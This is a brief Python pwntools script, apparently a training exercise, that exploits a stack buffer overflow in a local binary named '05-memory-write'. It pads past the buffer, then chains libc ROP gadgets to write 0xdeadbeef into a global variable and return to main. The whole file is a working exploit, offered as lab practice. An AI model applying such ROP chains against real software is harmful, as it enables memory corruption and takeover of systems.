#!/usr/bin/python

from pwn import *

context(arch='x86', os='linux', endian='little', word_size=64)

p = process('./05-memory-write')

# 0x7ffff7a15000 /lib/x86_64-linux-gnu/libc-2.19.so
# 0x0000000000112ecf : pop rcx ; ret
# 0x0000000000001b8e : pop rdx ; ret
# 0x0000000000117fd8 : mov dword ptr [rcx], edx ; ret
# $1 = (int *) 0x601054 <x>

libc = 0x7ffff7a15000
pop_rcx = libc + 0x0000000000112ecf
pop_rdx = libc + 0x0000000000001b8e
mov_rcx_edx = libc + 0x0000000000117fd8
x = 0x601054
main = 0x00000000004005f0

payload = ''
payload += 'a' * 128
payload += 'b' * 8
payload += p64(pop_rcx)
payload += p64(x)
payload += p64(pop_rdx)
payload += p64(0xdeadbeef)
payload += p64(mov_rcx_edx)
payload += p64(main)

p.send(payload)

p.interactive()
